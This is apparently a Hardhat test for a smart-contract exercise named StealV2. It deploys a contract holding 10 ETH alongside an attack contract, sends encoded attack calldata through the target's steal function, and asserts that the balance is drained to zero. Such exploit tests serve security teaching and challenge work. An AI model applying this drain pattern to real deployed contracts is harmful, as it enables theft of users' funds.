import { expect } from "chai";
import hre, { ethers } from "hardhat";

describe("StealV2", function () {
  it("Should steal the funds V2", async function () {
    const [msg_sender] = await ethers.getSigners();

    const StealV2 = await hre.ethers.getContractFactory("StealV2");
    const StealV2Attack = await hre.ethers.getContractFactory("StealV2Attack");
    const bounty = 10000000000000000000n; // 10 ETH

    const stealV2 = await StealV2.deploy({ value: bounty.toString() });
    const stealV2Attack = await StealV2Attack.deploy();

    // assert that contract balance is initialized correctly
    expect(await ethers.provider.getBalance(stealV2.address)).to.equal(bounty);

    const calldata = new ethers.utils.Interface([
      "function attack(address)",
    ]).encodeFunctionData("attack", [msg_sender.address]);
    await stealV2.steal(stealV2Attack.address, calldata);

    // assert that contract balance drained
    expect(await ethers.provider.getBalance(stealV2.address)).to.equal(0);
  });
});
